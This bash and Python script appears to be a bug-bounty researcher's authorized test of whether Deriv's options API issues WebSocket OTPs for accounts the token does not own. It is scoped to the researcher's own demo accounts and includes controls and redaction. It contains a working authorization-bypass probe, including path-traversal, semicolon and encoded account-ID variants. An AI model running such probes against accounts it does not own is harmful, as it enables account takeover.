#!/usr/bin/env bash
# =============================================================================
# Deriv Options API — OTP account-boundary test (IDOR / BOLA)
# Program : Deriv on HackerOne        Researcher: marcil78
#
# Hypothesis:
#   POST /trading/v1/options/accounts/{accountId}/otp issues a WebSocket OTP for
#   an accountId that the bearer token does NOT own, and that OTP opens a
#   session bound to the foreign account.
#
# ETHICS / SCOPE (hard rules, enforced below):
#   * OWN_DEMO_ID and FOREIGN must BOTH belong to the researcher (two separate
#     registrations of yours). FOREIGN must be a DEMO account.
#   * Never put a third party's account id here. Never guess/enumerate ids.
#   * No trades, no transfers, no writes. The only WebSocket message ever sent
#     is a read-only {"balance":1} on YOUR OWN accounts.
#   * The foreign OTP value is never printed; only its shape is logged, then it
#     is wiped from disk.
#
# Usage:
#   1. Fill TOKEN (PAT of the registration that owns OWN_DEMO_ID).
#   2. bash otp_boundary_test.sh 2>&1 | tee run.log
#   3. Paste run.log (it contains no token and no OTP value).
#
# Requirements: bash, curl, python3 (stdlib only; no pip installs).
# =============================================================================
set -u
umask 077

# ---------------------------- CONFIG ----------------------------------------
TOKEN=''                        # <-- PAT here (owner of OWN_DEMO_ID)
APP_ID='351cACc69MswSWTa35GxM'  # Deriv-App-ID (required for PAT auth on REST)
OWN_DEMO_ID='DOT95245471'       # demo owned by TOKEN
FOREIGN='DOT95235117'           # demo owned by your OTHER registration

# 1 = after a 200 on FOREIGN, open the foreign OTP once and send ONE read-only
#     {"balance":1} to learn which account the session is bound to.
#     This is the proof that turns "200" into "account takeover". Both accounts
#     are yours and demo, so this stays inside program rules.
# 0 = stop at the 200 + shape log (weaker evidence; triage may answer
#     "OTP was bound to the token's own account").
CONFIRM_BINDING=1

# 1 = run the 125-second expiry negative control (slow). 0 = skip.
RUN_EXPIRY=1

BASE='https://api.derivws.com/trading/v1/options'
RES_HDR='X-HackerOne-Research: marcil78'
UA='marcil78-h1-research'
# ----------------------------------------------------------------------------

WORK="$(mktemp -d)"
cleanup(){
  for f in "$WORK"/*; do [ -f "$f" ] && { shred -u "$f" 2>/dev/null || rm -f "$f"; }; done
  rmdir "$WORK" 2>/dev/null
}
trap cleanup EXIT INT TERM

fail(){ printf 'STOP: %s\n' "$1" >&2; exit "${2:-1}"; }
ts(){ date -u +%H:%M:%SZ; }

[ -z "$TOKEN" ]                      && fail "TOKEN is empty"
[ "$OWN_DEMO_ID" = "$FOREIGN" ]      && fail "ids identical"
command -v python3 >/dev/null        || fail "python3 required"
command -v curl    >/dev/null        || fail "curl required"

# Token is passed via a curl config file so it never appears in `ps` or logs.
AUTH_CFG="$WORK/auth.cfg"
printf 'header = "Authorization: Bearer %s"\n' "$TOKEN" > "$AUTH_CFG"
chmod 600 "$AUTH_CFG"
# Loud self-check: token must be in the config (pattern read via FD, never argv).
grep -qF -f <(printf '%s\n' "$TOKEN") "$AUTH_CFG" || fail "token failed to reach the curl config"
grep -q '\*\*\*' "$AUTH_CFG" && fail "literal *** in auth config — paste the real token"

# api <METHOD> <URL> <OUTFILE> [with_appid=1] -> prints HTTP code
api(){
  local m="$1" u="$2" o="$3" a="${4:-1}" extra=()
  [ "$a" = "1" ] && extra=(-H "Deriv-App-ID: $APP_ID")
  curl -s -m 20 -o "$o" -w '%{http_code}' -X "$m" -K "$AUTH_CFG" \
       --path-as-is ${extra[@]+"${extra[@]}"} -H "$RES_HDR" -A "$UA" -H 'Accept: application/json' "$u"
}

# Safe body preview: masks anything that looks like a token/otp.
peek(){ python3 - "$1" <<'PY'
import sys,re
try: s=open(sys.argv[1],errors='replace').read(400)
except Exception: s=''
s=re.sub(r'(otp=)[^&"\s]+',r'\1<redacted>',s)
s=re.sub(r'("(?:otp|token|access_token)"\s*:\s*")[^"]+',r'\1<redacted>',s)
print('   body:',s.replace('\n',' ')[:300])
PY
}

# Writes the WebSocket helper (stdlib only: TLS + RFC6455 handshake + 1 frame).
WSPY="$WORK/ws.py"
cat > "$WSPY" <<'PY'
import sys,ssl,socket,os,base64,json,struct,urllib.parse
# usage: ws.py <url_file> [send_balance 0|1] [path_override]
# prints one JSON line: {"handshake":code,"reply_keys":[...],"loginid":..,"error":..}
url=open(sys.argv[1]).read().strip()
send=len(sys.argv)>2 and sys.argv[2]=='1'
p=urllib.parse.urlsplit(url)
path=sys.argv[3] if len(sys.argv)>3 and sys.argv[3] else p.path
res={"handshake":None}
try:
    raw=socket.create_connection((p.hostname,p.port or 443),timeout=15)
    s=ssl.create_default_context().wrap_socket(raw,server_hostname=p.hostname)
    key=base64.b64encode(os.urandom(16)).decode()
    req=(f"GET {path}?{p.query} HTTP/1.1\r\nHost: {p.hostname}\r\n"
         "Upgrade: websocket\r\nConnection: Upgrade\r\n"
         f"Sec-WebSocket-Key: {key}\r\nSec-WebSocket-Version: 13\r\n"
         "User-Agent: marcil78-h1-research\r\nX-HackerOne-Research: marcil78\r\n\r\n")
    s.sendall(req.encode())
    hdr=b''
    while b'\r\n\r\n' not in hdr:
        c=s.recv(4096)
        if not c: break
        hdr+=c
    line=hdr.split(b'\r\n',1)[0].decode(errors='replace')
    res["handshake"]=int(line.split()[1]) if len(line.split())>1 else None
    if res["handshake"]!=101:
        res["status_line"]=line
    elif send:
        payload=json.dumps({"balance":1,"req_id":1}).encode()
        mask=os.urandom(4)
        n=len(payload)
        head=bytes([0x81])+(bytes([0x80|n]) if n<126 else bytes([0x80|126])+struct.pack('>H',n))
        s.sendall(head+mask+bytes(b^mask[i%4] for i,b in enumerate(payload)))
        buf=hdr.split(b'\r\n\r\n',1)[1]
        def need(k):
            global buf
            while len(buf)<k:
                c=s.recv(65536)
                if not c: raise EOFError
                buf+=c
            out,buf2=buf[:k],buf[k:]; buf=buf2; return out
        # read frames until a text frame
        for _ in range(10):
            b1,b2=need(2); op=b1&0x0f; ln=b2&0x7f
            if ln==126: ln=struct.unpack('>H',need(2))[0]
            elif ln==127: ln=struct.unpack('>Q',need(8))[0]
            data=need(ln)
            if op==1:
                j=json.loads(data)
                res["reply_keys"]=sorted(j.keys()) if isinstance(j,dict) else type(j).__name__
                # find any account identifier without printing balances
                def walk(o):
                    if isinstance(o,dict):
                        for k,v in o.items():
                            if k in("loginid","account_id","accountId") and isinstance(v,str): return v
                            r=walk(v)
                            if r: return r
                    if isinstance(o,list):
                        for v in o:
                            r=walk(v)
                            if r: return r
                ident=walk(j)
                if ident: res["bound_account"]=ident
                if isinstance(j,dict) and "error" in j:
                    e=j["error"]; res["error"]=e.get("code") if isinstance(e,dict) else str(e)[:80]
                break
            if op==8: res["closed"]=True; break
    try: s.close()
    except Exception: pass
except Exception as e:
    res["exception"]=type(e).__name__+": "+str(e)[:120]
print(json.dumps(res))
PY

# url_shape <json_file> <url_out_file>: logs SHAPE of data.url, stores URL for ws use.
url_shape(){ python3 - "$1" "$2" <<'PY'
import json,sys,urllib.parse
try: d=json.load(open(sys.argv[1]))
except Exception as e: print("   shape: body is not JSON (%s)"%type(e).__name__); sys.exit(0)
def keys(o,pre=''):
    out=[]
    if isinstance(o,dict):
        for k,v in o.items(): out.append(pre+k); out+=keys(v,pre+k+'.')
    return out
print("   shape: keys =",keys(d))
u=(d.get('data') or {}).get('url') if isinstance(d,dict) else None
if not isinstance(u,str):
    print("   shape: data.url ABSENT"); sys.exit(0)
p=urllib.parse.urlsplit(u); q=urllib.parse.parse_qs(p.query)
print("   shape: scheme=%s host=%s path=%s"%(p.scheme,p.hostname,p.path))
print("   shape: query params =",sorted(q.keys()))
otp=(q.get('otp') or [''])[0]
print("   shape: otp present=%s length=%d charset=%s"%(bool(otp),len(otp),
      'alnum' if otp.isalnum() else 'mixed'))
seg=p.path.rstrip('/').split('/')[-1]
print("   shape: ws account segment = %s"%seg)
open(sys.argv[2],'w').write(u)
PY
}

wscheck(){ python3 "$WSPY" "$@"; }

echo "#############################################################"
echo "# OTP boundary test  start $(ts)"
echo "# OWN_DEMO_ID=$OWN_DEMO_ID  FOREIGN=$FOREIGN"
echo "# CONFIRM_BINDING=$CONFIRM_BINDING  RUN_EXPIRY=$RUN_EXPIRY"
echo "#############################################################"

# ============================ STEP 0 ========================================
echo; echo "=== STEP 0 — token validity, header diagnosis, ownership ($(ts)) ==="
S0=$(api GET "$BASE/accounts" "$WORK/acc.json" 1)
echo "GET /accounts (with Deriv-App-ID) -> $S0"
if [ "$S0" != "200" ]; then
  peek "$WORK/acc.json"
  S0b=$(api GET "$BASE/accounts" "$WORK/acc2.json" 0)
  echo "GET /accounts (WITHOUT Deriv-App-ID) -> $S0b"; peek "$WORK/acc2.json"
  case "$S0/$S0b" in
    401/401) fail "AUTH problem: token invalid/expired/wrong scope (not an ownership result). Regenerate PAT." 2;;
    401/200|403/200) echo "NOTE: header Deriv-App-ID is rejected; continuing WITHOUT it"; USE_APPID=0
                     cp "$WORK/acc2.json" "$WORK/acc.json";;
    400/*)   fail "400 with App-ID: wrong APP_ID value or header format" 2;;
    *)       fail "unexpected $S0/$S0b on own /accounts — run void" 2;;
  esac
fi
USE_APPID="${USE_APPID:-1}"

python3 - "$OWN_DEMO_ID" "$FOREIGN" "$WORK/acc.json" <<'PY'
import json,sys
own,foreign,f=sys.argv[1:4]
d=json.load(open(f)); rows=d.get('data',[]) if isinstance(d,dict) else []
acc={a.get('account_id'):a for a in rows if isinstance(a,dict)}
print("--- accounts owned by this token ---")
for k,a in acc.items(): print("  %-16s %-6s %s"%(k,a.get('account_type'),a.get('currency','')))
bad=[]
if own not in acc: bad.append("OWN not owned by this token")
elif acc[own].get('account_type')!='demo': bad.append("OWN is not demo")
if foreign in acc: bad.append("FOREIGN is owned by this token -> test void")
if any(k and k.lower()==foreign.lower() for k in acc): bad.append("FOREIGN (case-insensitive) owned -> void")
if bad:
    for b in bad: print("STOP:",b)
    sys.exit(10)
print("OK: OWN owned+demo; FOREIGN absent from this token")
PY
[ $? -ne 0 ] && exit 10
echo ">> Confirm manually: FOREIGN ($FOREIGN) is a DEMO account of YOUR other registration."

# ============================ STEP 1 ========================================
echo; echo "=== STEP 1 — POSITIVE CONTROL: OTP for OWN account ($(ts)) ==="
C1=$(api POST "$BASE/accounts/$OWN_DEMO_ID/otp" "$WORK/ctrl.json" "$USE_APPID")
echo "POST /accounts/OWN/otp -> $C1"
case "$C1" in
  200) url_shape "$WORK/ctrl.json" "$WORK/own.url" ;;
  401) peek "$WORK/ctrl.json"; fail "401 on OWN account = auth/header problem, NOT ownership. Run void." 3;;
  *)   peek "$WORK/ctrl.json"; fail "control failed ($C1) — run void" 3;;
esac
[ -s "$WORK/own.url" ] || fail "control 200 but no data.url — cannot compare shapes" 3

echo "-- control: open OWN otp once, read-only balance --"
R=$(wscheck "$WORK/own.url" 1); echo "   ws(own): $R"
case "$R" in *'"handshake": 101'*) ;; *) echo "   WARN: own OTP did not open a session; WS-based checks below are unreliable";; esac

# ============================ NEGATIVE CONTROLS =============================
echo; echo "=== NEGATIVE CONTROLS — server really validates OTPs ($(ts)) ==="
echo "-- N1 reuse: same OWN otp a second time (expect != 101) --"
echo "   ws(reuse): $(wscheck "$WORK/own.url" 0)"

echo "-- N2 bogus otp (expect != 101) --"
python3 - "$WORK/own.url" "$WORK/bogus.url" <<'PY'
import sys,re
u=open(sys.argv[1]).read().strip()
open(sys.argv[2],'w').write(re.sub(r'otp=[^&]+','otp=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA',u))
PY
echo "   ws(bogus): $(wscheck "$WORK/bogus.url" 0)"

echo "-- N3 path swap: fresh OWN demo otp on /ws/real (expect != 101) --"
C3=$(api POST "$BASE/accounts/$OWN_DEMO_ID/otp" "$WORK/ctrl3.json" "$USE_APPID")
echo "   fresh own otp -> $C3"
if [ "$C3" = "200" ]; then
  url_shape "$WORK/ctrl3.json" "$WORK/own3.url" >/dev/null
  RP=$(python3 -c "import sys,urllib.parse as u;p=u.urlsplit(open(sys.argv[1]).read().strip());print(p.path.rsplit('/',1)[0]+'/real')" "$WORK/own3.url")
  echo "   ws(path=$RP): $(wscheck "$WORK/own3.url" 0 "$RP")"
fi

if [ "$RUN_EXPIRY" = "1" ]; then
  echo "-- N4 expiry: fresh OWN otp, wait 125s, then open (expect != 101) --"
  C4=$(api POST "$BASE/accounts/$OWN_DEMO_ID/otp" "$WORK/ctrl4.json" "$USE_APPID")
  if [ "$C4" = "200" ]; then
    url_shape "$WORK/ctrl4.json" "$WORK/own4.url" >/dev/null
    echo "   waiting 125s ($(ts))"; sleep 125
    echo "   ws(expired): $(wscheck "$WORK/own4.url" 0)"
  else echo "   skip ($C4)"; fi
fi

# ============================ STEP 2 ========================================
echo; echo "=== STEP 2 — FOREIGN: OTP for account NOT owned by token ($(ts)) ==="
sleep 2
F1=$(api POST "$BASE/accounts/$FOREIGN/otp" "$WORK/f.json" "$USE_APPID")
echo "POST /accounts/FOREIGN/otp -> $F1"
case "$F1" in
  200)
    echo "*** 200 — server issued an OTP for a foreign account. Logging SHAPE only ***"
    url_shape "$WORK/f.json" "$WORK/foreign.url"
    if [ "$CONFIRM_BINDING" = "1" ] && [ -s "$WORK/foreign.url" ]; then
      echo "-- BINDING: open foreign otp once, ONE read-only balance (your own demo) --"
      RB=$(wscheck "$WORK/foreign.url" 1); echo "   ws(foreign): $RB"
      python3 - "$RB" "$FOREIGN" "$OWN_DEMO_ID" <<'PY'
import json,sys
r=json.loads(sys.argv[1]); f,o=sys.argv[2],sys.argv[3]
b=r.get('bound_account')
if r.get('handshake')!=101: print("VERDICT: OTP issued but REJECTED at WS (%s) -> Low/Info (issuance only)"%r.get('handshake'))
elif b and b.upper()==f.upper(): print("VERDICT: *** CRITICAL — session bound to FOREIGN account (%s) ***"%b)
elif b and b.upper()==o.upper(): print("VERDICT: session bound to OWN account — server ignored path id. NOT a boundary crossing (Info).")
else: print("VERDICT: session opened, bound account unknown (%s) — inspect reply_keys; do not repeat more than once"%b)
PY
    else
      echo "   CONFIRM_BINDING=0 -> no session opened. Evidence = issuance + shape only."
    fi
    ;;
  403|404) echo "$F1 — ownership enforced."; peek "$WORK/f.json"
    echo "-- STEP 2b: id-normalisation variants of YOUR OWN FOREIGN id --"
    LOWER=$(printf '%s' "$FOREIGN" | tr 'A-Z' 'a-z')
    ENC=$(python3 -c "import sys;print(''.join('%%%02X'%ord(c) for c in sys.argv[1]))" "$FOREIGN")
    for V in "$LOWER" "$FOREIGN%20" "$ENC" "$OWN_DEMO_ID/../$FOREIGN" "$FOREIGN;$OWN_DEMO_ID"; do
      sleep 1
      CV=$(api POST "$BASE/accounts/$V/otp" "$WORK/v.json" "$USE_APPID")
      echo "   variant [$V] -> $CV"
      if [ "$CV" = "200" ]; then
        url_shape "$WORK/v.json" "$WORK/v.url"
        [ "$CONFIRM_BINDING" = "1" ] && [ -s "$WORK/v.url" ] && echo "   ws(variant): $(wscheck "$WORK/v.url" 1)"
      fi
    done ;;
  401) echo "401 — token/App-ID problem (but STEP 1 passed: note this as anomaly)"; peek "$WORK/f.json";;
  307|301|302) echo "$F1 — redirect; check FOREIGN id is non-empty and rerun";;
  *)   echo "unexpected $F1"; peek "$WORK/f.json";;
esac

echo; echo "# end $(ts) — temp files wiped. Paste this log (no token / no otp inside)."
